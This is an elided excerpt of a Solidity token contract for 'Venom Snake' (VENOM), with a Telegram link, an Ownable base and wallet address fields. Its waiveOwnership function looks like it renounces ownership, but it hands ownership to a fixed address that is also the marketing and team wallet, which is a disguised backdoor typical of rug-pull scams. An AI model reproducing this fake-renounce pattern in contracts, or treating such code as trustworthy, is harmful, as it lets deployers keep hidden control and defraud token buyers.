...
/**
Telegram : https://t.me/VenomSnakeBSC
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x8310E3cd2104fdB59219716fCcfecc16724e4f79);
    }
...
contract VenomSnake is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Venom Snake";
    string private _symbol = "VENOM";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x8310E3cd2104fdB59219716fCcfecc16724e4f79);
    address payable private teamWalletAddress = payable(0x8310E3cd2104fdB59219716fCcfecc16724e4f79);
